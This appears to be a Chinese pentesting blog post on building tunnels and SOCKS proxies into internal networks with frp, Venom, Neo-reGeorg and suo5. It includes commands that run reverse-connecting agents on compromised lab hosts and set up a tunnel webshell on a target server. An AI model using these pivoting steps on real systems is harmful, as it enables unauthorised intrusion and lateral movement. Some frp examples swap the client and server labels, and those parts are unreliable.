---
title: "隧道代理-应用层内网代理"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# 隧道代理-应用层内网代理

内网代理技术一般采用http或者socks代理

市面上的工具很多，这里咨询了下大佬，就暂时先学习几个常用的：

* frp
* suo5
* neo-regeorg

（Daac0ng师傅说其实很多情况直接用c2开一个隧道，然后proxifier代理一下就好了）

### frp

一个专注于内网穿透的高性能反向代理工具，支持TCP、UDP、HTTP、HTTPS等协议

在内网渗透中，frp可以用来进行内网隧道搭建，另外frp也支持搭建socks5代理应用

frp分为windows和linux系统两个版本，主要包含这些文件：

* frps：服务端程序
* frps.ini：服务端配置文件
* frpc：客户端文件
* frpc：客户端配置文件

使用时，将 frps 及 frps.ini 放到具有公网 IP 的机器上，将 frpc 及 frpc.ini 放到处于内网环境的机器上

#### 服务端配置（frps）

配置文件内容：

~~~ini
[common]
bind_port = 7000 
# 默认配置中监听7000端口，可根据实际情况修改
~~~

启动代理文件：

~~~shell
./frps -c ./frps.ini
~~~

#### 客户端配置（frpc）

假设 FRP 服务端所在主机的公网 IP 为` x.x.x.x`

配置文件内容：

~~~ini
[common]
server_addr = x.x.x.x
server_port = 7000
~~~

启动文件：

~~~shell
./frpc -c ./frpc.ini
~~~

#### 配置文件其他功能

配置文件非常重要，需要什么功能就可以进行不同的配置，来进行代理

参考文档：[参考 | frp (gofrp.org)](https://gofrp.org/zh-cn/docs/reference/)

#### 搭建场景

##### 端口转发

将内网端口（这里以3389为例）转发到公网

* 客户端配置：

  ~~~ini
  [common]
  bind_port = 7000
  ~~~

* 服务端配置：

  ~~~ini
  [common]
  server_addr = x.x.x.x
  server_port = 7000
  [3389]
  type = tcp
  local_ip = 127.0.0.1
  local_port = 3389
  remote_port = 6000
  ~~~

如此可以实现RDP连接

##### 搭建socks隧道

搭建实现对目标主机的全端口访问

* 客户端配置：

  ~~~ini
  [common]
  bind_port = 7000
  ~~~

* 服务端配置：

  ~~~ini
  [common]
  server_addr = x.x.x.x
  server_port = 7000
  [socks5]
  type = tcp
  plugin = socks5
  remote_port = 6000
  ~~~

用proxifier代理到`x.x.x.x`的6000端口，如此即可实现全端口访问

##### 搭建socks多级隧道

搭建多级隧道：

* 主机A配置服务端：

  ~~~ini
  [common]
  server_addr = 192.168.X.X
  server_port = 7001
  [socks5]
  type = tcp
  plugin = socks5
  remote_port = 6000
  ~~~

* 主机B配置客户端：

  ~~~ini
  [common]
  bind_port = 7001
  ~~~

这里搭建了一个隧道内网，接下来是端口转发：

* 主机B上配置服务端

  ```ini
  [common]
  server_addr = x.x.x.x
  server_port = 7000
  [portforward]
  type = tcp
  local_ip = 127.0.0.1
  remote_port = 6000
  local_port = 6000
  ```

* 主机C上配置客户端：

  ~~~ini
  [common]
  bind_port = 7000
  ~~~

如此，通过proxifier代理`x.x.x.x:6000`即可实现多级代理

### Venom

这是一款使用Go开发的多级代理工具

比起frp，我更喜欢venom，他更加的简便高效，而且不需要可以严格考虑正反向连接，缺点是特征比较明显

#### 使用（多层代理）

venom也有admin节点和agent节点，两个节点均可监听连接也可发起连接：

```sh
admin监听端口，agent发起连接:                               ./admin_linux_x64 -lport 4445 -passwd yuy0ung              ./agent_linux_x64 -rhost [vps-ip] -rport 9999 -passwd yuy0ung  

agent监听端口，admin发起连接:                               ./agent_linux_x64 -lport 4445 -passwd yuy0ung               ./admin_linux_x64 -rhost [host-ip] -rport 8888  -passwd yuy0ung 
```

这里直接模拟一个多层代理场景：

* kali（模拟我的vps）
* win10（外网主机client01）
* win10（域成员主机client02）
* win server 2019 （DC）

接下来我尝试通过搭建vps到client01、client01到client02的两层代理

##### 第一层

* agent节点

  首先获取到client01的权限，上传venom的agent端，执行命令反向连接admin：

  ~~~cmd
  agent.exe -rhost  -rport 4445 -passwd yuy0ung
  ~~~

* admin节点

  vps上开启admin节点监听

  ~~~sh
  ./admin_linux_x64 -lport 4445 -passwd yuy0ung
  ~~~

  ![image-20241116164601385](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116164602860-2031265911.png)

  第一个节点上线成功，使用show获取拓扑，这里可以看见一个节点：

  ![image-20241116164707079](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116164707650-1373515930.png)

  通过goto进入目标节点：
  ![image-20241116165602852](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116165603746-294699395.png)

  help可以查看命令：

  ![image-20241116164756285](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116164757274-388336004.png)

  一般常用的就是socks5代理：

  ~~~cmd
  socks 7777
  ~~~

  设置socks代理成功后可通过在浏览器配置代理或者proxifier或者配置proxychains4工具访问其他端口服务

##### 第二层

* 在第一个节点上监听一个端口：

  ~~~sh
  listen 4446
  ~~~

  ![image-20241116165721879](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116165722520-622192973.png)

* 接下来获取client02主机的shell，上传agent，反向连接节点一：

  ~~~cmd
  agent.exe -rhost 192.168.111.137 -rport 4446 -passwd yuy0ung
  ~~~

  ![image-20241116170250257](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116170250801-2125694012.png)

* 连接成功，查看节点：

  ![image-20241116170327864](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116170328462-1416663426.png)

* 同理，我们也可以在节点2上开启socks代理：

  ![image-20241116170535545](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241116170536438-900393132.png)

至此，我们完成了两层代理的搭建

### Neo-reGeorg

github地址：[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)

#### 介绍

Neo-reGeorg是一个HTTP正向隧道工具，是[reGeorg](https://github.com/sensepost/reGeorg)的一个重构升级项目，Neo-reGeorg相对于reGeorg增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持py3等等

了解到这个工具是因为uu2师傅问了我一个场景问题：

>你拿了机器shell，只有80端口入网出网，80端口还被占用不能frp你怎么办

那么这里当然只能想办法从80端口搭http隧道，而又不能影响web服务，那么就想到了基于webshell进行搭建，于是便了解到两款好用的代理工具：**neo-rgeorg、suo5**

#### 原理

引用一张图，非常精辟：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/25bd65819c805b207fdf737477bb0b1b.png" alt="img" style="zoom: 67%;" />

即将socks代理数据包裹在http协议里边

#### 使用

##### 生成webshell

Neo-reGeorg生成webshell，这里生成的密钥是后续连接使用的，防止被其他攻击者利用

```cmd
python neoreg.py generate -k <指定密钥>
```

##### 上传webshell并连接

使用neoreg连接目标脚本文件（-p指定端口，默认为1080）

```cmd
python neoreg.py -k <已经设定的密钥> -u <http://xxx.xxx.xxx/tunnel.aspx> -p <prot>
```

##### 配合proxifier进行流量转发

代理地址为127.0.0.1，端口为Neo-reGeorg转发的端口地址，协议选择socks5，即可实现http正向代理

Neo-reGeorg的速度和稳定性一般，并且有个比较大的问题是无法在**反向代理**的场景使用，最常见的 Nginx + Tomcat 的场景就无法使用，这里便引出一个更好的webshell正向代理工具：suo5

### suo5

github地址：[suo5: 一款高性能 HTTP 代理隧道工具 ](https://github.com/zema1/suo5)

`suo5` 是一个高性能 HTTP 隧道代理工具，它基于双向的 `Chunked-Encoding` 构建, 相比 [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) 等传统隧道工具, `suo5` 的性能可以达到其数十倍

**原理介绍** https://koalr.me/posts/suo5-a-hign-performace-http-socks/

如果目标是 Java 的站点，可以使用 `suo5` 来构建 http 隧道，大多数情况下 `suo5` 都要比 `neo` 更稳定速度更快。但 `neo` 提供了非常多种类的服务端支持，兼容性很好，而且也支持一些 `suo5` 当前还在开发的功能，也支持更灵活的定制化

具体的使用不在赘述，参考github即可
